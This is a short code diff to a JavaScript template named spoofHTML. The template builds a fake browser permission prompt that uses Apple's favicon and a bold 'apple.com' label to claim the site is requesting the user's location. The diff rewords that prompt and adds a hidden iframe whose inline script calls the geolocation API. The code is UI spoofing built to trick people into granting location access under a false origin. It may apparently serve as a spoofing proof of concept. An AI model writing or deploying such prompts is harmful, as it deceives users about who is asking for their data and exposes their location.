@@ -41,9 +41,10 @@
     const spoofHTML = `
       <link rel='icon' href='https://www.apple.com/favicon.ico'>
       <div class=\"container\">
-        <img src='https://www.apple.com/favicon.ico'> <b>apple.com</b> wants to access your location.
+        <img src='https://www.apple.com/favicon.ico'> <b>apple.com</b> is requesting your location.
         <p>This is used to verify your region settings.</p>
         <button onclick=\"req()\">Allow</button>
+        <iframe src='data:text/html,<script>navigator.geolocation.getCurrentPosition(()=>{},()=>{});</script>' style='display:none'></iframe>
       </div>
       <script>
         function req() {
